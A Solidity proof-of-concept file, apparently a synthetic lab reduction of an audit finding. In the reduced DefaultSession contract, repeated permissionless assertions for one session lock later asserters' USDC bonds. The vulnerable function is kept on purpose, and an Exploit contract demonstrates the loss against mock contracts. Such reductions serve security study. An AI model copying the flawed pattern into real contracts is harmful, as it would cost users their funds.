// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Majority Protocol — multi assertResults: all but first lose bonds
    (Cyfrin / Dacian, 2026-01-27 majority-protocol-v2.0, #65379)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: DefaultSession.assertResults / assertDataFor is
    permissionless and does not prevent a second assertion for the same
    sessionId. Each caller posts a USDC bond. On resolution, the first
    successful recordResults sets winners[sessionId]; subsequent
    recordResults reverts WinnersAlreadyRecorded, so the OO callback
    reverts and later asserters permanently lose their bonds.

    Vulnerable line: assertDataFor has no per-session uniqueness (@> VULN).
    Provenance: Engage-Protocol/engage-protocol @ cca0cb3
    Fixed: 4c5483f (callback returns if already processed).
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    string public constant name = "USDC";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allowance");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal Optimistic Oracle mock: holds bond until settle(true/false).
contract MockOptimisticOracle {
    uint256 public constant MIN_BOND = 250e6; // $250 USDC (6 decimals)

    struct Pending {
        address currency;
        address asserter;
        address callbackRecipient;
        uint256 bond;
        bool settled;
    }

    mapping(bytes32 => Pending) public pending;
    uint256 public nonce;

    function getMinimumBond(address) external pure returns (uint256) {
        return MIN_BOND;
    }

    function assertTruth(
        address asserter,
        address callbackRecipient,
        address currency,
        uint256 bond
    ) external returns (bytes32 assertionId) {
        assertionId = keccak256(abi.encodePacked(asserter, callbackRecipient, nonce++));
        // pull bond from caller (DefaultSession already holds/approves; we pull from msg.sender)
        MockToken(currency).transferFrom(msg.sender, address(this), bond);
        pending[assertionId] = Pending({
            currency: currency,
            asserter: asserter,
            callbackRecipient: callbackRecipient,
            bond: bond,
            settled: false
        });
    }

    /// @dev Resolve: if callback succeeds, return bond to asserter; if it reverts, bond stuck here.
    function settle(bytes32 assertionId, bool truth) external returns (bool callbackOk) {
        Pending storage p = pending[assertionId];
        require(!p.settled, "settled");
        p.settled = true;
        // Call callback; on revert, bond is NOT returned (models OO recommendation + real loss).
        (bool ok,) = p.callbackRecipient.call(
            abi.encodeWithSignature("assertionResolvedCallback(bytes32,bool)", assertionId, truth)
        );
        callbackOk = ok;
        if (ok) {
            MockToken(p.currency).transfer(p.asserter, p.bond);
        }
        // else: bond locked on oracle — second asserter loss
    }
}

/// @dev Minimal SessionManager state oracle for Ended check.
contract SessionManager {
    enum SessionState {
        Created,
        Ongoing,
        Ended,
        Cancelled,
        Concluded
    }

    mapping(uint256 => SessionState) public states;

    function setState(uint256 sessionId, SessionState s) external {
        states[sessionId] = s;
    }

    function getSessionState(uint256 sessionId) external view returns (SessionState) {
        return states[sessionId];
    }
}

/// @dev Reduced DefaultSession + SessionResultAsserter.
contract DefaultSession {
    struct Assertion {
        uint256 sessionId;
        address asserter;
        bool resolved;
        address[] winners;
        uint256[] totalXPs;
        uint256[] totalTimes;
    }

    MockToken public immutable usdc;
    MockOptimisticOracle public immutable optimisticOracle;
    SessionManager public immutable sessionManager;

    mapping(bytes32 => Assertion) public assertions;
    mapping(uint256 => address[]) public winners;

    error GameNotEnded();
    error WinnersAlreadyRecorded(uint256 sessionId);
    error AssertionNotInitialized(bytes32 assertionId);
    error NotOptimisticOracle(address sender);
    error SessionIdMismatch(uint256 sessionId, uint256 assertionSessionId);

    constructor(address _usdc, address _oo, address _sm) {
        usdc = MockToken(_usdc);
        optimisticOracle = MockOptimisticOracle(_oo);
        sessionManager = SessionManager(_sm);
    }

    function assertResults(
        uint256 sessionId,
        address[] calldata proposedWinners,
        uint256[] calldata totalXPs,
        uint256[] calldata totalTimes
    ) external returns (bytes32 assertionId) {
        require(sessionManager.getSessionState(sessionId) == SessionManager.SessionState.Ended, GameNotEnded());
        return assertDataFor(sessionId, proposedWinners, totalXPs, totalTimes, msg.sender);
    }

    function assertDataFor(
        uint256 sessionId,
        address[] calldata _winners,
        uint256[] calldata totalXPs,
        uint256[] calldata totalTimes,
        address asserter
    ) internal returns (bytes32 assertionId) {
        asserter = asserter == address(0) ? msg.sender : asserter;
        uint256 bond = optimisticOracle.getMinimumBond(address(usdc));
        // FIX: require(!sessionHasAssertion[sessionId], "already asserted");
        usdc.transferFrom(msg.sender, address(this), bond); // @> VULN: no per-session uniqueness — multiple bonds accepted
        usdc.approve(address(optimisticOracle), bond);
        assertionId = optimisticOracle.assertTruth(asserter, address(this), address(usdc), bond);
        Assertion storage a = assertions[assertionId];
        a.sessionId = sessionId;
        a.asserter = asserter;
        a.resolved = false;
        // copy arrays
        for (uint256 i = 0; i < _winners.length; i++) {
            a.winners.push(_winners[i]);
            a.totalXPs.push(totalXPs[i]);
            a.totalTimes.push(totalTimes[i]);
        }
    }

    function recordResults(uint256 sessionId, bytes32 assertionId) public {
        require(sessionManager.getSessionState(sessionId) == SessionManager.SessionState.Ended, GameNotEnded());
        require(sessionId == assertions[assertionId].sessionId, SessionIdMismatch(sessionId, assertions[assertionId].sessionId));
        require(assertions[assertionId].resolved, AssertionNotInitialized(assertionId));
        require(winners[sessionId].length == 0, WinnersAlreadyRecorded(sessionId));
        winners[sessionId] = assertions[assertionId].winners;
    }

    function assertionResolvedCallback(bytes32 assertionId, bool assertedTruthfully) public {
        require(msg.sender == address(optimisticOracle), NotOptimisticOracle(msg.sender));
        // FIX (4c5483f): if (assertions[assertionId].resolved) { return; }
        if (assertedTruthfully) {
            assertions[assertionId].resolved = true;
            recordResults(assertions[assertionId].sessionId, assertionId);
        } else {
            delete assertions[assertionId];
        }
    }

    function winnersLength(uint256 sessionId) external view returns (uint256) {
        return winners[sessionId].length;
    }
}

contract Asserter {
    MockToken public usdc;
    DefaultSession public ds;

    constructor(MockToken _usdc, DefaultSession _ds) {
        usdc = _usdc;
        ds = _ds;
    }

    function assert_(
        uint256 sessionId,
        address[] calldata w,
        uint256[] calldata xps,
        uint256[] calldata times
    ) external returns (bytes32) {
        usdc.approve(address(ds), type(uint256).max);
        return ds.assertResults(sessionId, w, xps, times);
    }
}

contract Exploit {
    MockToken public usdc; // CREATE 1
    MockOptimisticOracle public oo; // CREATE 2
    SessionManager public sm; // CREATE 3
    DefaultSession public ds; // CREATE 4
    Asserter public userA; // CREATE 5
    Asserter public userB; // CREATE 6

    uint256 public constant SESSION = 1;
    uint256 public constant BOND = 250e6;

    constructor() {
        usdc = new MockToken();
        oo = new MockOptimisticOracle();
        sm = new SessionManager();
        ds = new DefaultSession(address(usdc), address(oo), address(sm));
        userA = new Asserter(usdc, ds);
        userB = new Asserter(usdc, ds);
    }

    function run() external {
        sm.setState(SESSION, SessionManager.SessionState.Ended);

        address[] memory w = new address[](1);
        w[0] = address(0xBEEF);
        uint256[] memory xps = new uint256[](1);
        xps[0] = 200;
        uint256[] memory times = new uint256[](1);
        times[0] = 30;

        // Fund both asserters with a bond each.
        usdc.mint(address(userA), BOND);
        usdc.mint(address(userB), BOND);

        // Two permissionless assertResults for the same session.
        bytes32 idA = userA.assert_(SESSION, w, xps, times);
        bytes32 idB = userB.assert_(SESSION, w, xps, times);
        require(idA != idB, "distinct assertions");
        require(usdc.balanceOf(address(userA)) == 0 && usdc.balanceOf(address(userB)) == 0, "bonds pulled");
        require(usdc.balanceOf(address(oo)) == BOND * 2, "oracle holds both bonds");

        // First resolution succeeds → winners set, bond returned to A.
        bool okA = oo.settle(idA, true);
        require(okA, "first settle must succeed");
        require(ds.winnersLength(SESSION) == 1, "winners recorded");
        require(usdc.balanceOf(address(userA)) == BOND, "A recovered bond");

        // Second resolution: recordResults reverts WinnersAlreadyRecorded → callback fails → B loses bond.
        bool okB = oo.settle(idB, true);
        require(!okB, "second settle callback must fail");
        require(usdc.balanceOf(address(userB)) == 0, "B lost bond");
        require(usdc.balanceOf(address(oo)) == BOND, "B's bond stuck on oracle");
    }
}
